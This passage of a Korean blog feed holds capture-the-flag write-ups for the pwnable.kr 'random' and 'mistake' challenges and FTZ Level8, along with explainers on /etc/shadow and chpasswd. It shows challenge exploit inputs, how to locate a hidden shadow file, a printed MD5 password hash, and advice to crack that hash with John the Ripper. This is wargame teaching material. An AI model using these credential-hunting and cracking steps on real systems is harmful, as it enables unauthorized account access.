&lt;p&gt;이 초기값을 이용하여 연산한 결과를 rand로 반환해 주는데, 초기값을 &lt;code class=&quot;language-text&quot;&gt;time(NULL)&lt;/code&gt;을 넣어주었기 때문에 항상 다른 초기값이 들어가게 된다.&lt;/p&gt;
&lt;p&gt;하지만 이 프로그램의 경우는 srand를 하는 부분이 없기 때문에 항상 같은 값을 가지고 오게 된다. 그러므로 만들어야할 값을 예측할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;random@ubuntu:~$ ./random
&lt;span class=&quot;token number&quot;&gt;3039230856&lt;/span&gt;
Good&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;
Mommy, I thought libc random is unpredictable&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Pwnable.kr mistake]]></title><description><![CDATA[문제는 다음과 같다. password파일을 읽어 이 파일에 있는 값과 xor된 입력받은 값을 비교해 일치할 경우 해결되는 문제이다.
hint : operator priority 인데, 17번째 줄을 보면 이유를 알 수 있다. img…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 23 Jul 2016 12:00:00 GMT</pubDate><content:encoded>&lt;p&gt;문제는 다음과 같다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;fcntl.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PW_LEN&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;XORKEY&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;len&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        s&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;^=&lt;/span&gt; XORKEY&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; fd&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fd&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/home/mistake/password&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;O_RDONLY&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0400&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;can&apos;t open password %d\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; fd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;do not bruteforce...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; pw_buf&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;PW_LEN&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;len&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;pw_buf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;PW_LEN&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;read error\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; pw_buf2&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;PW_LEN&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;input password : &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%10s&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pw_buf2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// xor your input&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pw_buf2&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pw_buf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pw_buf2&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PW_LEN&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Password OK\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/bin/cat flag\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Wrong Password\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;password파일을 읽어 이 파일에 있는 값과 xor된 입력받은 값을 비교해 일치할 경우 해결되는 문제이다.
hint : operator priority 인데, 17번째 줄을 보면 이유를 알 수 있다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2016-07/Pwnable.kr-mistake/img1.png&quot; alt=&quot;img1&quot;&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;사진 : Microsoft MSDN&lt;/p&gt;
&lt;p&gt;이 표를 보게되면 대입 연산자는 우선순위에서 많이 늦게 실행되고, 비교연산자의 경우 대입보다 &lt;code class=&quot;language-text&quot;&gt;우선적&lt;/code&gt;으로 실행된다.&lt;/p&gt;
&lt;p&gt;결과적으로 open의 결과와 0을 비교한 값을 fd에 넣어주게 된다. open의 결과는 정상적으로 열릴 경우 0이상의 값이 나오게 되므로, 저 조건문은 &lt;strong&gt;거짓&lt;/strong&gt;이 된다.&lt;/p&gt;
&lt;p&gt;그러므로 fd에는 0이 들어가게 된다.&lt;/p&gt;
&lt;p&gt;0이 들어간 fd를 기준으로 모든 연산을 실행하게 되면, 0은 &lt;code class=&quot;language-text&quot;&gt;stdin&lt;/code&gt;이기 때문에 표준입력에서 password의 값을 가져오게 된다.&lt;/p&gt;
&lt;p&gt;그러므로 사용자가 입력한 10개의 값과, scanf에 의해 입력받은 값을 비교하게 된다.&lt;/p&gt;
&lt;p&gt;XOR키의 값은 1이기 때문에 모든 비트에서 가장 하위 비트만 1과 xor해주게 된다. &lt;code class=&quot;language-text&quot;&gt;1&lt;/code&gt;이라는 문자를 16진수로 표현하면 &lt;code class=&quot;language-text&quot;&gt;110001&lt;/code&gt;인데, 이 값을 1과 xor하게 되면 &lt;code class=&quot;language-text&quot;&gt;110000&lt;/code&gt;이다. 이 값은 &lt;code class=&quot;language-text&quot;&gt;0&lt;/code&gt;이라는 문자의 값을 가지게 된다.&lt;/p&gt;
&lt;p&gt;이를 기준으로 문제를 풀면 다음과 같다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;mistake@ubuntu:~$ ./mistake
&lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt; not bruteforce&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
&lt;span class=&quot;token number&quot;&gt;1111111111&lt;/span&gt;
0000000000
input password &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; Password OK
Mommy, the operator priority always confuses me :&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Linux shadow파일]]></title><description><![CDATA[리눅스에는 shadow…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 23 Jul 2016 06:00:00 GMT</pubDate><content:encoded>&lt;p&gt;리눅스에는 shadow라는 파일이 존재한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ls -al /etc/shadow&lt;/span&gt;
-rw-r----- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root shadow &lt;span class=&quot;token number&quot;&gt;869&lt;/span&gt; Mar &lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;18&lt;/span&gt;:48 /etc/shadow&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 파일은 다음과 같은 구조로 이루어져있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# cat /etc/shadow&lt;/span&gt;
root:&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;:16869:0:99999:7:::
&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. 여러 계정 정보 &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;①:②:③:④:⑤:⑥:⑦:⑧:⑨ 으로 이루어져있다. 각각 다음과 같은 정보를 가지고 있는다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;① : 계정명&lt;/li&gt;
&lt;li&gt;② : 패스워드, !와 *, 그리고 &lt;code class=&quot;language-text&quot;&gt;암호화된 패스워드&lt;/code&gt;로 나타낸다. !와 *의 경우는 패스워드가 잠겨있음을 나타낸다. 직접적인 로그인은 불가능함을 나타낸다. 암호화된 방법은 4개정도로 나타낼 수 있는데, &lt;code class=&quot;language-text&quot;&gt;$1$&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;$2a$&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;$5$&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;$6$&lt;/code&gt;중 하나로 시작한다. 1의 경우는 &lt;code class=&quot;language-text&quot;&gt;md5&lt;/code&gt;, 2a는 &lt;code class=&quot;language-text&quot;&gt;Blowfish&lt;/code&gt;, 5는 &lt;code class=&quot;language-text&quot;&gt;SHA-256&lt;/code&gt;, 6의 경우는 &lt;code class=&quot;language-text&quot;&gt;SHA-512&lt;/code&gt;로 대응되어 암호화 된다. 이 외에도 여러 기법이 있을수 있지만, 대표적으로 위의 암호화를 사용한다.&lt;/li&gt;
&lt;li&gt;③ : 패스워드를 변경한 날짜, &lt;code class=&quot;language-text&quot;&gt;1970년 1월 1일&lt;/code&gt;을 기준으로 카운트한다.&lt;/li&gt;
&lt;li&gt;④ : 패스워드를 재변경하기 까지 필요한 일수&lt;/li&gt;
&lt;li&gt;⑤ : 패스워드를 변경할 최대 일수, 이 기간이 지나면 계정로그인이 불가능하다.&lt;/li&gt;
&lt;li&gt;⑥ : 패스워드변경을 알려주기위한 기간, 변경을 해야함을 알려주는 기간이다.&lt;/li&gt;
&lt;li&gt;⑦ : 패스워드가 만료된 날&lt;/li&gt;
&lt;li&gt;⑧ : 계정사용이 만료된 날&lt;/li&gt;
&lt;li&gt;⑨ : 사용안함&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[FTZ Level8]]></title><description><![CDATA[용량이 2700임을 기준으로 검색을 해본다. 위와 같이 정보를 얻을 수 있다. 다음과 같이 패스워드 정보를 얻을 수 있다. shadow파일은 이 링크를 참조해 주길 바란다. 얻은 정보를 이용하여 존더리퍼라는 툴을 사용하면 패스워드를 구할 수 있다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 23 Jul 2016 00:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level8@ftz level8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; hint

level9의 shadow 파일이 서버 어딘가에 숨어있다.
그 파일에 대해 알려진 것은 용량이 &lt;span class=&quot;token string&quot;&gt;&quot;2700&quot;&lt;/span&gt;이라는 것 뿐이다.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;용량이 2700임을 기준으로 검색을 해본다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level8@ftz level8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;find&lt;/span&gt; / -size 2700c &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null
/var/www/manual/ssl/ssl_intro_fig2.gif
/etc/rc.d/found.txt

&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level8@ftz level8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -al /etc/rc.d/found.txt
-r--r-----    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root     level8       &lt;span class=&quot;token number&quot;&gt;2700&lt;/span&gt; Sep &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2011&lt;/span&gt; /etc/rc.d/found.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위와 같이 정보를 얻을 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level8@ftz level8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; /etc/rc.d/found.txt
level9:&lt;span class=&quot;token variable&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$vkY6sSlG&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$6RyUXtNMEVGsfY7Xf0wps&lt;/span&gt;.:11040:0:99999:7:-1:-1:134549524
  &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. 생략 &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;다음과 같이 패스워드 정보를 얻을 수 있다. shadow파일은 이 &lt;a href=&quot;/articles/2016-07/Linux-shadow-file&quot;&gt;링크&lt;/a&gt;를 참조해 주길 바란다.&lt;/p&gt;
&lt;p&gt;얻은 정보를 이용하여 존더리퍼라는 툴을 사용하면 패스워드를 구할 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Linux chpasswd]]></title><description><![CDATA[리눅스상에서 비밀번호를 를 이용하여 변경하고 싶은 경우가 있다. 보통 redhat계열의 경우는 의 옵션을 사용하여 변경하지만, ubuntu…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 24 Apr 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;리눅스상에서 비밀번호를 &lt;code class=&quot;language-text&quot;&gt;스크립트&lt;/code&gt;를 이용하여 변경하고 싶은 경우가 있다.&lt;/p&gt;
&lt;p&gt;보통 &lt;strong&gt;redhat&lt;/strong&gt;계열의 경우는 &lt;code class=&quot;language-text&quot;&gt;passwd --stdin&lt;/code&gt;의 옵션을 사용하여 변경하지만, &lt;strong&gt;ubuntu&lt;/strong&gt;의 경우는 불가능 하여 이를 해결하기 위해 찾은 명령어다.&lt;/p&gt;
&lt;p&gt;이 명령어는 관리자 권한을 가지고만 가능한 명령이다. 사용법은 다음과 같다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# chpasswd --help&lt;/span&gt;
Usage: chpasswd &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;options&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

Options:
  -c, --crypt-method METHOD     the crypt method &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;one of NONE DES MD5 SHA256 SHA512&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  -e, --encrypted               supplied passwords are encrypted
  -h, --help                    display this &lt;span class=&quot;token builtin class-name&quot;&gt;help&lt;/span&gt; message and &lt;span class=&quot;token builtin class-name&quot;&gt;exit&lt;/span&gt;
  -m, --md5                     encrypt the &lt;span class=&quot;token function&quot;&gt;clear&lt;/span&gt; text password using
                                the MD5 algorithm
  -R, --root CHROOT_DIR         directory to &lt;span class=&quot;token function&quot;&gt;chroot&lt;/span&gt; into
  -s, --sha-rounds              number of SHA rounds &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; the SHA*
                                crypt algorithms&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;옵션은 암호화와 chroot_dir에 대해서 나와있다. 실제 비밀번호를 변경하는 방법은 다음과 같다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# chpasswd&lt;/span&gt;
User:Password&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이와 같이 사용해 주는데, ^D(EOF)의 경우는 &lt;code class=&quot;language-text&quot;&gt;Ctrl + D&lt;/code&gt;키를 누른 것이다.&lt;/p&gt;
&lt;p&gt;이 명령어는 한번에 &lt;code class=&quot;language-text&quot;&gt;여러 계정&lt;/code&gt;을 변경할 수 있는것이 특징이다.&lt;/p&gt;
